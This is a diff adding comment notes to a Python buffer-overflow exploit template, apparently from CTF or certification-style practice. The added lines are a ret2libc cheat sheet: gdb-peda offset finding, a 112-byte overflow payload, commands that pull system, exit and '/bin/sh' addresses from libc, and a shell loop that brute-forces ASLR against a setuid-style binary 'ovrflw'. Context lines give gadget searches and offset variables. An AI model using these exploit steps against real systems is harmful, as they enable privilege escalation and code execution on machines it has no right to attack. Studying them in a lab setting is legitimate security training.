@@ -201,6 +201,7 @@ def exploit():
     #   PUSH ESP, RETN: 
     # Find instruction:                        !mona jmp -r esp -cpb "\x00\x0A\0D"
     # Find offset of instruction:              objdump -D -M intel user32.dll | grep 'jmp.*esp' | head
+    #                                          objdump -D validate | grep call| grep eax
     # Instructions:                            Debug - \xCC | Nop - \x90 | SUB ESP \x10 - \x83\xEC\x10
     # Exit functions:                          EXITFUNC=none / EXITFUNC=thread / EXITFUNC=process 
     # Usual bad-characters:                    00 0a
@@ -215,6 +216,23 @@ def exploit():
     #  '\xEF\xBE\xAD\xDE'
     #  >>> struct.pack("<I", 3737844653)
     #  '\xAD\xFB\xCA\xDE'
+
+    # gdb-peda$ pattern_create 500
+    # gdb-peda$ pattern_offset AA8A
+    # gdb-peda$ run `python -c 'print "A"*112 + "BBBB"'`
+    # ldd /usr/local/bin/ovrflw | grep libc
+    # readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -e " system@" -e " exit@"
+    # strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/" 
+    #
+    # exit_loc = 0xb75f8000+0x33260
+    # system_loc = 0xb75f8000+0x40310
+    # bin_sh_loc  = 0xb75f8000+0x162bac
+    #
+    # When ASLR is enabled:
+    # while true; do /usr/local/bin/ovrflw $(python -c 'print "\x90"*112 + "\x10\x83\x63\xb7" + "\x60\xb2\x62\xb7" + "\xac\xab\x75\xb7"'); done
+
+    # cat /proc/sys/kernel/randomize_va_space
+    # 0 - no / 1 -  Shared libraries, stack, mmap(), VDSO and heap are randomized. / 2 - full (brk())
 
     buf_totlen = 1024
     offset_srp = 146
